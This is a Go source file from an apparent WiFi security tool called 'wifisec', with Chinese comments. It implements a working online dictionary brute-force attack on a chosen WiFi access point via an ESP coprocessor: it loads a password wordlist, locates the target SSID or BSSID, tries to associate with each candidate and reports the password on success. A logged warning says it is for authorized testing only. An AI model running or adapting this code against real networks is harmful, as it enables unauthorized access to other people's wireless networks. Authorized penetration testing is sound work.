package functions

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	platformesp "github.com/ctkqiang/wifisec/internal/platform/esp"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

// BruteForceConnectToWiFi 对目标 AP 进行在线密码字典爆破。
// 用法：wifisec brute <ssid|bssid> with-pass: <字典文件> [串口]
//
// 仅支持 ESP 协处理器路径：在线破解的本质是让无线芯片逐个尝试关联 AP，
// Linux/Windows 原生路径没有「尝试连接」的抽象，且系统级关联会污染
// 网络配置；ESP 的 WiFi.begin 是最干净的试验场。
//
// 在线破解的固有局限（启动时向用户说明）：
//   - 每次尝试需 2-5 秒（AP 应答失败的时间），大字典耗时长
//   - 现代 AP 常在 3-5 次失败后限速或临时锁定 STA，触发后后续尝试全部超时
//   - WPA3 的 SAE 握手对在线爆破更不友好，成功率低于 WPA2
//
// 离线握手破解（aircrack 路线）需固件支持 monitor 抓包，当前未实现。
func BruteForceConnectToWiFi(args []string) error {
	target, targetMAC, wordlistPath, portName, err := parseBruteArgs(args)
	if err != nil {
		return err
	}

	passwords, err := loadWordlist(wordlistPath)
	if err != nil {
		return err
	}

	utilities.Info("字典 %s 加载完成：%d 个候选密码", wordlistPath, len(passwords))
	if len(passwords) == 0 {
		return errors.New("字典文件为空，无密码可尝试")
	}

	if portName == "" {
		portName, err = platformesp.DefaultPort()
		if err != nil {
			return err
		}
	}

	utilities.Info("连接 %s，等待固件就绪…", portName)
	injector, err := platformesp.Open(portName)
	if err != nil {
		return err
	}
	defer injector.Close()

	utilities.Info("协处理器就绪（协议 v%d），扫描周边网络定位目标…", injector.FirmwareVersion())
	scanned, err := injector.Scan()
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	ssid := resolveTargetSSID(scanned, target, targetMAC)
	if ssid == "" {
		return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
	}
	utilities.Info("目标锁定：SSID %q", ssid)

	utilities.Warn("在线爆破模式：每次尝试约 2-5 秒，AP 可能在多次失败后限速；仅用于授权测试")

	started := time.Now()
	for idx, pass := range passwords {
		ok, err := injector.Associate(ssid, pass)
		if err != nil {
			utilities.Warn("[%d/%d] 尝试 %q 出错：%v", idx+1, len(passwords), pass, err)
			continue
		}

		if ok {
			elapsed := time.Since(started).Round(time.Second)
			utilities.Info("命中！密码：%q（尝试 %d/%d · 耗时 %s）", pass, idx+1, len(passwords), elapsed)
			return nil
		}

		utilities.Info("[%d/%d] 失败：%q", idx+1, len(passwords), pass)
	}

	utilities.Warn("字典遍历完毕，未找到正确密码（共 %d 个候选 · 耗时 %s）",
		len(passwords), time.Since(started).Round(time.Second))
	return nil
}

// parseBruteArgs 解析 brute 子命令参数。
// 支持两种等价写法：
//
//	wifisec brute <ssid|bssid> with-pass: <file> [串口]
//	wifisec brute <ssid|bssid> <file> [串口]
//
// with-pass: 关键字可带或不带尾部冒号，匹配时大小写不敏感。
func parseBruteArgs(args []string) (target string, targetMAC net.HardwareAddr, wordlistPath, portName string, err error) {
	if len(args) < 2 {
		err = errors.New("用法：wifisec brute <ssid|bssid> with-pass: <字典文件> [串口]")
		return
	}

	target = strings.TrimSpace(args[0])
	if target == "" {
		err = errors.New("目标 SSID/BSSID 不能为空")
		return
	}

	// 判定目标是 BSSID 还是 SSID；解析失败视为 SSID。
	targetMAC, err = net.ParseMAC(target)
	if err != nil {
		targetMAC = nil
		err = nil
	}

	// 定位字典文件路径：跳过 with-pass 关键字后取第一个非空参数。
	var rest []string
	for i := 1; i < len(args); i++ {
		token := strings.TrimSpace(args[i])
		if token == "" {
			continue
		}
		lower := strings.ToLower(token)
		if lower == "with-pass" || lower == "with-pass:" {
			continue
		}
		rest = append(rest, token)
	}

	if len(rest) < 1 {
		err = errors.New("缺少字典文件参数；用法：wifisec brute <ssid|bssid> with-pass: <字典文件>")
		return
	}

	wordlistPath = rest[0]
	if len(rest) > 1 {
		portName = rest[1]
	}

	return target, targetMAC, wordlistPath, portName, nil
}

// loadWordlist 逐行读取密码字典，去空白行、去首尾空白、跳过注释（# 开头）。
// 不去重：字典可能有意重复以测试 AP 的失败计数策略，保持原始顺序与频次。
func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("打开字典文件 %s 失败：%w", path, err)
	}
	defer f.Close()

	var passwords []string
	scanner := bufio.NewScanner(f)
	// 单行密码理论上没有长度上限，WiFi WPA 密码最长 63 字节，
	// 64KB 缓冲足以覆盖任何合理字典条目。
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		passwords = append(passwords, line)
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("读取字典文件失败：%w", err)
	}

	return passwords, nil
}

// resolveTargetSSID 在扫描结果中定位目标，返回用于关联的 SSID。
// 目标是 BSSID 时反查对应 SSID；目标是 SSID 时原样返回（需存在于扫描结果中）。
// 同名 SSID 多 AP 场景下取第一个即可——关联尝试由固件按 SSID 发起，
// 不绑定具体 BSSID，AP 侧会自行选择接入的 STA。
func resolveTargetSSID(scanned []platformesp.Network, target string, targetMAC net.HardwareAddr) string {
	if targetMAC != nil {
		for _, ap := range scanned {
			if strings.EqualFold(ap.BSSID, targetMAC.String()) {
				return ap.SSID
			}
		}
		return ""
	}

	for _, ap := range scanned {
		if ap.SSID == target {
			return ap.SSID
		}
	}
	return ""
}
